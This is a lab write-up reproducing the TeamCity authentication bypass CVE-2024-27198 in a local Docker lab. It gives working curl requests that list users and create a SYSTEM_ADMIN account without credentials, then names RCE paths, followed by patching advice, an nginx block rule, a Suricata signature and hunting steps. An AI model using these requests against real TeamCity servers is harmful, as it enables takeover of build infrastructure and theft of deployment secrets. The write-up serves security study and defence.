# Lab Writeup: JetBrains TeamCity Authentication Bypass → Admin RCE (CVE-2024-27198)

> **Environment**: Local Docker lab (vulhub/teamcity/CVE-2024-27198)
> **Purpose**: Security research & exploit-development practice
> **Status**: ✅ Complete
> **Date**: 2026-05-19

---

## Overview

JetBrains TeamCity < 2023.11.4 has a critical authentication bypass in its `BaseController`. The `updateViewIfRequestHasJspParameter()` method reads a `jsp` query parameter and uses it to set the view name for internal request forwarding. An attacker requests any non-existent URL (triggering a 404 path) with `?jsp=/app/rest/<endpoint>;.jsp` — the semicolon acts as a Servlet path-parameter separator (stripped during resolution) while the `.jsp` suffix passes the validation check. This grants unauthenticated access to any internal REST API endpoint, enabling admin account creation and full RCE.

| Item | Detail |
|------|--------|
| CVE | CVE-2024-27198 |
| CVSS | 9.8 (Critical) |
| Type | Authentication bypass (path parameter trick) |
| Affected | TeamCity On-Premises < 2023.11.4 |
| Prerequisite | Network access to port 8111 (no credentials needed) |
| Default port | 8111/tcp |
| Default creds (vulhub) | `admin:admin` (auto-created) |

---

## Attack Chain

```
GET /hax?jsp=/app/rest/users;.jsp  (no auth)
  → BaseController forwards to /app/rest/users (bypasses auth)
  → list users / create SYSTEM_ADMIN user
  → login as new admin → plugin upload / build config → RCE
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
cd ~/Security/tools/vulhub/teamcity/CVE-2024-27198
docker compose up -d
# Web UI: http://127.0.0.1:8111  (admin:admin auto-created)
# TeamCity is a large Java app — wait ~90 seconds for initialization
# (503 responses mean it's still starting; 401 means it's ready)
```

### 2. Fingerprinting

```bash
curl -sI http://127.0.0.1:8111/ | grep -i "TeamCity"
# Expected: TeamCity-Node-Id: MAIN_SERVER
```

### 3. Authentication Bypass — List Users (no credentials)

The core trick: request a non-existent path with `?jsp=/app/rest/<endpoint>;.jsp`. The semicolon is a Servlet path-parameter separator — the app server strips `;.jsp` during resolution, but `BaseController` sees the `.jsp` suffix and forwards internally without auth.

```bash
curl -s "http://127.0.0.1:8111/hax?jsp=/app/rest/users;.jsp" \
  -H "Accept: application/json"
```

Response:
```json
{"count":1,"user":[{"username":"admin","id":1,"href":"/app/rest/users/id:1"}]}
```

### 4. Create Admin Account (no credentials)

```bash
curl -s -X POST "http://127.0.0.1:8111/hax?jsp=/app/rest/users;.jsp" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"username":"hacker","password":"hacker","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'
```

Response confirms `SYSTEM_ADMIN` role at global scope (`"scope":"g"`).

### 5. Verification — Admin API Access

```bash
curl -s -u hacker:hacker "http://127.0.0.1:8111/app/rest/server" \
  -H "Accept: application/json"
```

```
Version: 2023.11.3 (build 147512)
```

**Authentication bypass confirmed** — created a full SYSTEM_ADMIN account without any credentials. From here, RCE is trivial via:
- Build configuration with shell steps
- Malicious plugin upload
- Debug process attachment (port 5005 exposed)

---

## Lessons Learned

| Issue | Root Cause | Solution |
|-------|-----------|----------|
| TeamCity returns 503 for ~90 seconds after container start | Large Java application with Spring context initialization | Poll with `curl -sI` until you see 401 instead of 503 |
| `http_proxy` causes 503 even after TeamCity is up | system proxy intercepts localhost | `unset http_proxy` |
| The `;.jsp` suffix is critical | without it, `BaseController` won't trigger `updateViewIfRequestHasJspParameter()` | always append `;.jsp` to the target REST path |
| Any non-existent path works as the base | the 404 handler still calls `updateViewIfRequestHasJspParameter()` | `/hax`, `/nonexistent`, `/anything` all work |
| Created user persists across restarts | TeamCity stores users in internal DB | useful for persistence; also means cleanup requires explicit DELETE via API |

---

## Defense

TeamCity controllers are high-value CI/CD infrastructure — admin access means access to build secrets, deployment credentials, source code, and artifact signing keys. A single auth bypass here is typically game-over for the entire software supply chain.

### Hardening — reduce the attack surface

1. **Patch to TeamCity ≥ 2023.11.4** — the fix removes the `jsp` parameter handling from `BaseController` entirely.
2. **Network isolation**: TeamCity should never be internet-facing. Place behind a VPN or zero-trust proxy (Cloudflare Access, Tailscale, etc.).
3. **Reverse proxy path filtering**: block requests containing `;.jsp` or `;.` in query parameters at the WAF/nginx layer:
   ```nginx
   if ($args ~* ";\.jsp") { return 403; }
   ```
4. **Disable debug port**: remove `-agentlib:jdwp` from `TEAMCITY_SERVER_OPTS` in production — the debug port (5005) is a direct RCE vector post-auth-bypass.
5. **Audit existing users** after patching — if the instance was ever exposed, check for rogue admin accounts created via this bypass.
6. **Rotate all secrets** stored in TeamCity (SSH keys, cloud tokens, NuGet/Maven deploy creds) if any exposure window existed.

### Detection — spot the exploit in flight

1. **URL pattern**: any request with `?jsp=/app/rest/` in the query string is exploit-grade. No legitimate TeamCity workflow uses this pattern.
   ```
   alert http any any -> any 8111 (msg:"TeamCity CVE-2024-27198 auth bypass attempt";
     content:"jsp=/app/rest/"; http_uri;
     classtype:attempted-admin; sid:2024027198; rev:1;)
   ```
2. **User creation without session**: a `POST /app/rest/users` that arrives without a valid `TCSESSIONID` cookie from a prior login flow is exploitation.
3. **Admin account creation spike**: alert when any new user is created with `SYSTEM_ADMIN` role — in normal operations this is a rare, manually-initiated event.
4. **Access-log anomaly**: requests to non-existent paths (`/hax`, `/x`, random strings) that return 200 instead of 404 indicate the forwarding mechanism was triggered.
5. **Process behavior**: TeamCity JVM spawning build agents or shell processes outside of a legitimate build run.

### Threat Hunting — find the breach after the fact

1. **User audit**: `curl -u admin:admin http://localhost:8111/app/rest/users` — any user you don't recognize was likely created via this bypass. Check `createdDate` timestamps.
2. **Audit log**: TeamCity logs user creation events in `teamcity-server.log`. Search for `Creating user` entries without corresponding web-UI session activity.
3. **Build history**: check for builds triggered by the rogue account — these may contain exfiltration commands (`curl` uploading secrets to external endpoints).
4. **Plugin directory**: `find /opt/teamcity/webapps/ROOT/WEB-INF/plugins -newer <baseline> -type f` — malicious plugins are a common persistence mechanism.
5. **Credential usage downstream**: check all CI/CD secrets stored in TeamCity (cloud keys, SSH keys, deploy tokens) for unauthorized usage in external service logs.

---

## Tools & References

- [vulhub/teamcity/CVE-2024-27198](https://github.com/vulhub/vulhub/tree/master/teamcity/CVE-2024-27198)
- [Rapid7 — exploitation analysis](https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/)
- [JetBrains security advisory](https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now/)
- [NVD: CVE-2024-27198](https://nvd.nist.gov/vuln/detail/CVE-2024-27198)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment. No production systems were targeted. The purpose is educational — understanding attack techniques to build better defenses.
